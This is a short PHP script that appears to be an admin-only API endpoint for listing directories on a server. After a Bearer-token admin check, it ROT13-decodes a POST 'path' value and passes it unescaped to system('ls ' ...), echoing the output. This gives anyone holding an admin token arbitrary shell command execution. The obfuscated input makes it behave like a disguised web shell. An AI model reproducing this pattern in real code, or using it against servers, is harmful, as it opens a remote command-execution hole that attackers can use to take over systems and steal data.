<?php
require_once __DIR__ . '/../../../includes/auth.php';
$auth = '';
if (isset($_SERVER['HTTP_AUTHORIZATION'])) $auth = $_SERVER['HTTP_AUTHORIZATION'];
if (isset($_SERVER['REDIRECT_HTTP_AUTHORIZATION'])) $auth = $_SERVER['REDIRECT_HTTP_AUTHORIZATION'];
$token = null;
if (substr($auth, 0, 7) == 'Bearer ') $token = substr($auth, 7);
if (!$token) {
    header('HTTP/1.1 401 Unauthorized');
    echo 'unauthorized';
    exit;
}
$data = check_api_token($token);
if (!$data) {
    header('HTTP/1.1 401 Unauthorized');
    echo 'unauthorized';
    exit;
}
if (!isset($data['admin']) || $data['admin'] != 1) {
    header('HTTP/1.1 401 Unauthorized');
    echo 'unauthorized';
    exit;
}
$path = str_rot13(isset($_POST['path']) ? $_POST['path'] : '');
ob_start();
system('ls ' . $path);
$out = ob_get_clean();
header('Content-Type: text/plain');
echo $out;
